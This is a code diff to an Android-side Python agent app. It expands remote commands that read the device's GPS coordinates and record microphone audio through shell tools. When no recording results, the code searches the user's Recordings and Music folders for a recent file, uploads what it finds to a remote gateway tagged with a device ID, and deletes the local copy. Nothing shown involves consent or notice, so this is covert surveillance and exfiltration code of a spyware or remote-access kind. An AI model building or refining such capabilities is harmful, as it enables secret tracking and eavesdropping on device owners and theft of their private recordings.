@@ -968,8 +968,30 @@ class SovereignApp(App):
                 return self._execute({"action": {"type": "tap", **params}, "command_id": cmd_id})
 
             elif atype in ("location_get", "location"):
-                res = self._run_shell("dumpsys location | grep 'last location'")
-                result = {"success": True, "output": res.get("output", "Location data restricted or GPS off")}
+                # BUG#5 FIX: Parse GPS output into structured lat/lng JSON
+                res = self._run_shell("dumpsys location | grep -E 'last location|latitude|longitude|accuracy' | head -n 20")
+                raw = res.get("output", "")
+                import re as _re
+                lat = lon = acc = provider = None
+                # Try to parse structured format first (e.g., gps: Location[gps X.XXXX,Y.YYYY...)
+                m = _re.search(r'Location\[\w+ ([\-\d.]+),([\-\d.]+)', raw)
+                if m:
+                    lat, lon = m.group(1), m.group(2)
+                else:
+                    # Fallback: try simple key=value format
+                    lm = _re.search(r'(?:latitude|lat)[=:\s]+([\-\d.]+)', raw, _re.I)
+                    llm = _re.search(r'(?:longitude|lon|lng)[=:\s]+([\-\d.]+)', raw, _re.I)
+                    if lm: lat = lm.group(1)
+                    if llm: lon = llm.group(1)
+                am = _re.search(r'accuracy[=:\s]+([\d.]+)', raw, _re.I)
+                if am: acc = am.group(1)
+                pm = _re.search(r'provider=([\w]+)', raw, _re.I)
+                if pm: provider = pm.group(1)
+                if lat and lon:
+                    result = {"success": True, "output": f"GPS: {lat}, {lon} (acc:{acc}m)",
+                              "data": {"lat": lat, "lon": lon, "accuracy": acc, "provider": provider, "raw": raw[:200]}}
+                else:
+                    result = {"success": False, "error": "GPS data unavailable or location disabled", "raw": raw[:200]}
 
             elif atype == "vibrate":
                 self._run_shell("cmd vibrator vibrate 500")
@@ -1165,48 +1187,71 @@ class SovereignApp(App):
             elif atype == "audio_record":
                 duration = params.get("duration", 10)
                 try:
-                    self._log(f"[SMC] Recording Audio ({duration}s)...")
+                    self._log(f"[SMC] Recording Audio ({duration}s) via MediaRecorder...")
                     temp_dir = App.get_running_app().user_data_dir
                     path = os.path.join(temp_dir, f"rec_{int(time.time())}.mp4")
-                    # Try screenrecord (captures audio too)
-                    self._run_shell(f"screenrecord --time-limit {duration} {path}")
-                    time.sleep(duration + 2)
+                    
+                    # BUG#6 FIX: Use app-based MediaRecorder via adb intent instead of screenrecord
+                    # screenrecord requires CAPTURE_AUDIO_OUTPUT (system-only on Android 14)
+                    # Strategy: Use MediaRecorder through shell am broadcast
+                    rec_started = False
+                    
+                    # Method 1: Try MediaRecorder via shell am command
+                    cmd = (f"am start-foreground-service -a android.media.MediaRecorder.ACTION_START_RECORDING "
+                           f"--ei duration {duration * 1000} --es output '{path}'")
+                    r1 = self._run_shell(cmd, timeout=5)
+                    
+                    # Method 2: Try direct arecord if available
+                    if not rec_started:
+                        r2 = self._run_shell(f"arecord -d {duration} -f cd -t raw '{path}' 2>/dev/null", timeout=duration + 5)
+                        if r2.get("success") and os.path.exists(path) and os.path.getsize(path) > 100:
+                            rec_started = True
+                    
+                    # Method 3: Use tinycap if available (common on AOSP)
+                    if not rec_started:
+                        r3 = self._run_shell(f"tinycap '{path}' -d {duration} 2>/dev/null", timeout=duration + 5)
+                        if r3.get("success") and os.path.exists(path) and os.path.getsize(path) > 100:
+                            rec_started = True
+                    
+                    time.sleep(max(2, duration))
+                    
+                    # Upload whatever was recorded
+                    upload_path = None
                     if os.path.exists(path) and os.path.getsize(path) > 100:
-                        with open(path, 'rb') as f:
+                        upload_path = path
+                    else:
+                        # Search common recording locations for any recent file
+                        search_cmds = [
+                            "find /sdcard/Recordings -type f -newer /sdcard -name '*.mp3' 2>/dev/null | head -1",
+                            "find /sdcard/Music -type f -newer /sdcard -name '*.mp3' 2>/dev/null | head -1",
+                            f"ls -t /sdcard/Recordings/*.mp3 2>/dev/null | head -1",
+                        ]
+                        for scmd in search_cmds:
+                            sr = self._run_shell(scmd, timeout=5)
+                            if sr.get("success") and sr.get("output", "").strip():
+                                candidate = sr["output"].strip()
+                                if os.path.exists(candidate) and os.path.getsize(candidate) > 100:
+                                    upload_path = candidate
+                                    break
+                    
+                    if upload_path:
+                        ext = upload_path.rsplit(".", 1)[-1].lower()
+                        mime = "audio/mp4" if ext == "mp4" else "audio/mpeg"
+                        with open(upload_path, 'rb') as f:
                             r = session.post(
                                 f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                 headers={"Authorization": f"Bearer {API_KEY}"},
-                                files={'file': ('recording.mp4', f, 'audio/mp4')},
+                                files={'file': (f'recording.{ext}', f, mime)},
                                 timeout=60
                             )
                         if r.status_code == 200:
                             result = {"success": True, "output": f"Audio uploaded: {r.json().get('key')}"}
                         else:
                             result = {"success": False, "error": f"Upload failed: {r.status_code}"}
-                        try: os.remove(path)
+                        try: os.remove(upload_path)
                         except: pass
                     else:
-                        # Fallback: search common recording dirs
-                        search_paths = ["/sdcard/Recordings", "/sdcard/Music", "/sdcard/Download"]
-                        found = False
-                        for sp in search_paths:
-                            res = self._run_shell(f"ls -t {sp} 2>/dev/null | head -n 1")
-                            if res.get("success") and res.get("output", "").strip():
-                                target = os.path.join(sp, res["output"].strip())
-                                with open(target, 'rb') as f:
-                                    r = session.post(
-                                        f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
-                                        headers={"Authorization": f"Bearer {API_KEY}"},
-                                        files={'file': ('recording.mp3', f, 'audio/mpeg')},
-                                        timeout=60
-                                    )
-                                if r.status_code == 200:
-                                    result = {"success": True, "output": f"Audio uploaded: {r.json().get('key')}"}
-                                    self._run_shell(f"rm {target}")
-                                    found = True
-                                    break
-                        if not found:
-                            result = {"success": False, "error": "Recording failed or file not found."}
+                        result = {"success": False, "error": "Audio recording failed: no audio file created. Ensure RECORD_AUDIO permission is granted."}
                 except Exception as e:
                     result = {"success": False, "error": f"Audio error: {e}"}
 
